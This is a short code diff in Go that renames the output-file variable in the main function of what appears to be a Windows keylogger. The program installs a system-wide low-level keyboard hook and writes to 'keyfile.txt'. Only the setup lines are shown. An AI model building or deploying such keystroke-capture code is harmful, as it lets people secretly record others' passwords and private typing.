@@ -221,7 +221,8 @@ func UnhookWindowsHookEx(hhk HHOOK) bool {
 }
 
 func main() {
-	file, _ = os.Create("keyfile.txt")
+	outputFile := "keyfile.txt"
+	file, _ = os.Create(outputFile)
 	hInstance, _, _ := kernel32.NewProc("GetModuleHandleW").Call(0)
 	hook = SetWindowsHookEx(WH_KEYBOARD_LL, syscall.NewCallback(LowLevelKeyboardProc), hInstance, 0)
 
